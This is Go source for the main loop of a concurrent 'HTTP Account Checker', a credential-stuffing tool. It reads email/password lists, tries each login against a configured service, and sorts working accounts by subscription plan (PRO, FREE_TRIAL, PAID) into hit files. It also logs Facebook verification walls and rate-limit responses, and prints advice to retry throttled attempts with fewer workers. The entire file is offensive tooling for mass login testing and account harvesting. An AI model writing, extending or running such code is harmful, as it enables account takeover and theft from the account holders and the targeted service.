package main

import (
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"sync/atomic"
	"time"
)

type RunOptions struct {
	ConfigPath   string
	AccountsPath string
	ResultsDir   string
	Workers      int
}

func runChecker(opts RunOptions) (RunStats, time.Duration, error) {
	cfg, err := LoadConfig(opts.ConfigPath)
	if err != nil {
		return RunStats{}, 0, fmt.Errorf("config: %w", err)
	}

	w := cfg.Settings.Workers
	if opts.Workers > 0 {
		w = opts.Workers
	}
	if w <= 0 {
		w = 5
	}

	accounts, err := ParseAccountsFile(opts.AccountsPath)
	if err != nil {
		return RunStats{}, 0, fmt.Errorf("accounts: %w", err)
	}

	checker, err := NewChecker(cfg)
	if err != nil {
		return RunStats{}, 0, fmt.Errorf("checker init: %w", err)
	}

	baseDir := exeDir()
	resultsDir := opts.ResultsDir
	if resultsDir == "" {
		resultsDir = newRunResultsDir(baseDir, cfg)
	}
	if err := os.MkdirAll(resultsDir, 0o755); err != nil {
		return RunStats{}, 0, fmt.Errorf("output dir: %w", err)
	}

	fmt.Println("============================================================")
	fmt.Printf("  HTTP Account Checker — %s\n", cfg.Name)
	fmt.Printf("  Config   : %s\n", opts.ConfigPath)
	fmt.Printf("  Accounts : %s (%d lines)\n", opts.AccountsPath, len(accounts))
	fmt.Printf("  Workers  : %d  |  Delay: %dms  |  Retry: %d\n", w, cfg.Settings.DelayMS, cfg.Settings.RetryOnError)
	fmt.Printf("  Output   : %s\n", resultsDir)
	fmt.Println("============================================================")
	fmt.Println()

	jobs := make(chan Account, w*2)
	var wg sync.WaitGroup
	var hitCount, failCount, errCount, rateCount, verifyCount atomic.Int64
	var fileMu sync.Mutex
	start := time.Now()
	delay := time.Duration(cfg.Settings.DelayMS) * time.Millisecond

	for i := 0; i < w; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for acc := range jobs {
				if delay > 0 {
					time.Sleep(delay)
				}
				res := checker.Check(acc.Email, acc.Password)
				switch res.Status {
				case StatusHit:
					hitCount.Add(1)
					fmt.Println(res.ConsoleLine(cfg, true))
					fileMu.Lock()
					_ = writeResultFiles(cfg, res, resultsDir)
					fileMu.Unlock()
				case StatusFail:
					failCount.Add(1)
					fmt.Println(res.ConsoleLine(cfg, false))
					fileMu.Lock()
					_ = writeResultFiles(cfg, res, resultsDir)
					fileMu.Unlock()
				case StatusRateLimited:
					rateCount.Add(1)
					fmt.Printf("[RATE] %s | %s\n", acc.Email, res.Reason)
					fileMu.Lock()
					_ = writeResultFiles(cfg, res, resultsDir)
					fileMu.Unlock()
				case StatusVerifyRequired:
					verifyCount.Add(1)
					fmt.Printf("[SKIP] %s | Facebook verification required", acc.Email)
					if res.PlanName != "" {
						fmt.Printf(" (Plan=%s)", res.PlanName)
					}
					fmt.Println()
					fileMu.Lock()
					_ = writeResultFiles(cfg, res, resultsDir)
					fileMu.Unlock()
				default:
					errCount.Add(1)
					fmt.Printf("[ERROR] %s | %s\n", acc.Email, res.Reason)
					fileMu.Lock()
					_ = writeResultFiles(cfg, res, resultsDir)
					fileMu.Unlock()
				}
			}
		}()
	}

	for _, acc := range accounts {
		jobs <- acc
	}
	close(jobs)
	wg.Wait()

	elapsed := time.Since(start).Round(time.Millisecond)
	stats := RunStats{
		Total:       len(accounts),
		Hits:        hitCount.Load(),
		Fails:       failCount.Load(),
		RateLimited: rateCount.Load(),
		VerifySkip:  verifyCount.Load(),
		Errors:      errCount.Load(),
	}

	_ = writeRunSummary(filepath.Join(resultsDir, "summary.txt"), cfg, opts, stats, elapsed)

	fmt.Println("------------------------------------------------------------")
	fmt.Printf("Done in %s | HIT=%d FAIL=%d SKIP=%d RATE=%d ERROR=%d\n",
		elapsed, stats.Hits, stats.Fails, stats.VerifySkip, stats.RateLimited, stats.Errors)
	fmt.Printf("Results folder:\n  %s\n", filepath.Clean(resultsDir))
	fmt.Println("  summary.txt      — full run stats")
	fmt.Println("  hits.txt           — valid logins + active plan")
	fmt.Println("  by_plan/           — PRO, FREE_TRIAL, PAID...")
	fmt.Println("  paid.txt / free_trial.txt")
	fmt.Println("  facebook_verify.txt — login ok but Facebook verify wall")
	fmt.Println("  invalid.txt        — wrong password")
	fmt.Println("  rate_limited.txt   — HTTP 429 (retry with 3 workers)")
	fmt.Println("  errors.txt         — other errors")

	return stats, elapsed, nil
}
